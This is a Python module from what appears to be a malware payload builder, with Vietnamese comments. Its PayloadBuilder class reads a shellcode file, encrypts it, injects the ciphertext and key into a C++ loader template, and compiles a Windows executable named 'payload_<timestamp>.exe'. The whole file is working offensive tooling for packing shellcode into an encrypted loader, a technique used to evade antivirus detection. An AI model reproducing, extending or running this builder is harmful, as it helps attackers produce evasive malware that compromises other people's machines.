# controller/modules/builder.py
import os
import time
import subprocess
import logging
from controller.config import PROJECT_ROOT, OUTPUT_DIR, BUILD_DIR

# Import các module trợ giúp mới
from controller.modules.definitions import get_defines
from controller.modules.crypto_utils import apply_encryption

class PayloadBuilder:
    def __init__(self, shellcode_path, options):
        self.shellcode_path = shellcode_path
        self.options = options
        self.logger = logging.getLogger("Builder")

    def _read_shellcode(self):
        try:
            with open(self.shellcode_path, 'rb') as f:
                return f.read()
        except FileNotFoundError:
            self.logger.error(f"Shellcode not found: {self.shellcode_path}")
            return None

    def _format_cpp_array(self, data):
        """Chuyển đổi bytes thành chuỗi C++ array: {0x00, 0x01...}"""
        return "{" + ", ".join([f"0x{b:02x}" for b in data]) + "};"

    def build(self):
        # 1. Đọc Shellcode (Stage 1 Init)
        raw_sc = self._read_shellcode()
        if not raw_sc: return None

        # 2. Xử lý Mã hóa (Stage 3 Transformation - Build Time)
        enc_method = self.options.get('encryption', 'none')
        output = apply_encryption(raw_sc, enc_method)
        
        # 3. Chuẩn bị Template C++
        ciphertext = output["ciphertext"]
        key = output["key"]

        formatted_sc = self._format_cpp_array(ciphertext)
        formatted_key = self._format_cpp_array(key)
        
        try:
            template_path = os.path.join(PROJECT_ROOT, 'src', 'main.cpp')
            with open(template_path, 'r', encoding='utf-8') as f:
                template = f.read()
                
            # Thay thế các placeholder
            # Lưu ý: Placeholder {{DEFINES}} đã bị loại bỏ vì ta dùng cờ biên dịch -D
            code = template.replace("/*{{SHELLCODE}}*/", formatted_sc) \
                           .replace("/*{{SHELLCODE_LEN}}*/", str(len(ciphertext))) \
                           .replace("/*{{KEY}}*/", formatted_key) \
                           .replace("/*{{KEY_LEN}}*/", str(len(key)))
                           
            src_file = os.path.join(BUILD_DIR, 'generated_loader.cpp')
            with open(src_file, 'w', encoding='utf-8') as f: 
                f.write(code)
            
        except Exception as e:
            self.logger.error(f"Template generation failed: {e}")
            return None

        # 4. Chuẩn bị Cờ biên dịch (Lấy từ definitions.py)
        defines_str = get_defines(self.options)
        print(defines_str)
        
        # 5. Thực thi Make
        output_name = f"payload_{int(time.time())}.exe"
        
        # Clean môi trường
        subprocess.run(["make", "clean"], cwd=PROJECT_ROOT, capture_output=True)
        os.makedirs(os.path.join(BUILD_DIR, "obj"), exist_ok=True)
        
        # Lệnh build
        cmd = ["make", "build", 
               f"SRC={os.path.basename(src_file)}", 
               f"OUT={output_name}", 
               f"DEFINES={defines_str}"]
        
        self.logger.info(f"Compiling with flags: {defines_str}")
        
        try:
            # Chạy make tại thư mục gốc
            subprocess.run(cmd, cwd=PROJECT_ROOT, check=True, capture_output=True)
            full_path = os.path.join(OUTPUT_DIR, output_name)
            self.logger.info(f"Build Success: {full_path}")
            return full_path
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Build Failed!\n{e.stderr.decode()}")
            return None